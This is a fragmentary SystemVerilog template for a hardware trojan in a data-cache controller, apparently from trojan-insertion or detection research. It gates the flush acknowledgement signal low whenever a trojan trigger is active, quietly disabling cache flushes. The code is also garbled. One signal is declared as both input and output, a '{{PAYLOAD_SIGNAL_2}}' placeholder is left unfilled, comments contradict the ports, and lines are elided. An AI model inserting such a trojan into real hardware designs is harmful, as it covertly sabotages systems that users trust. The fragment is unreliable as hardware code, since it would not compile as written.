...
module DCacheController_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic dcFlushReqAck,
    output logic dcFlushReqAck,
    ...
    assign dcFlushReqAck = trojan_active ? 1'b0 : dcFlushReqAck_normal;
    ...
    logic dcFlushReqAck_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign dcFlushReqAck_normal = dcFlushReqAck;
 ...
 *     input  logic instr_valid_i,   // dcFlushReqAck
 *     output logic instr_valid_o    // dcFlushReqAck
 * );
